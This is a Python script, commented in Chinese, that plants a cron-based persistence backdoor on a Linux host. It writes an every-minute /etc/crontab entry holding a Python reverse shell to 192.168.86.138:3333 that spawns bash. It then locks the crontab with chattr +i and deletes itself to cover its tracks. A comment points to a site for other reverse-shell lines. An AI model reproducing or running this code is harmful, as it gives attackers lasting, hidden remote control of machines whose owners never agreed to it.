# coding=utf-8
# !/usr/bin/env python
from __future__ import print_function
import subprocess
import sys, os


def ml(command):
    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    process.wait()  # 等待子进程完成

    stdout, stderr = process.communicate()  # 获取子进程的输出和错误
    try:
        decoded_stdout = stdout.decode('utf-8')
    except UnicodeDecodeError:
        decoded_stdout = stdout.decode('latin1')
    try:
        decoded_stderr = stderr.decode('utf-8')
    except UnicodeDecodeError:
        decoded_stderr = stderr.decode('latin1')
    return decoded_stdout


def etc_crontab(shell):
    command = 'whoami'
    user = ml(command).strip()
    command = 'echo "*/1 * * * * ' + user + ' ' + shell + '" | sudo tee -a /etc/crontab'
    ml(command)
    command = 'cat /etc/crontab'
    j = ml(command)
    if '*/1 * * * *' in j:
        print("Yes----crontab计划任务后门")
    else:
        print("No----crontab计划任务后门")


def delete_current_script():
    try:
        script_path = os.path.abspath(sys.argv[0])
        os.remove(script_path)
        print("当前脚本文件已成功删除" + script_path)
    except Exception as e:
        print("无法删除当前脚本文件：", e)


def check_py():
    if sys.version_info.major == 3:
        print("当前运行的是 Python 3 版本。")
        ret = '3'
    elif sys.version_info.major == 2:
        print("当前运行的是 Python 2 版本。")
        ret = '2'
    else:
        print("未知的 Python 版本。")
        ret = ' '
    return ret


if __name__ == '__main__':
    # https://taoyuan.cool/shell/在这个网站获取反弹shell语句写在下面，注意，下面语句如果有双引号，请加上\\"进行转义，下面语句也可以在计划任务中，执行某个命令
    py = check_py()
    shell = """python""" + py + """  -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\"192.168.86.138\\",3333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\\"bash\\")'"""
    etc_crontab(shell)
    ml('chattr +i /etc/crontab')
    delete_current_script()  # 删除当前执行脚本文件
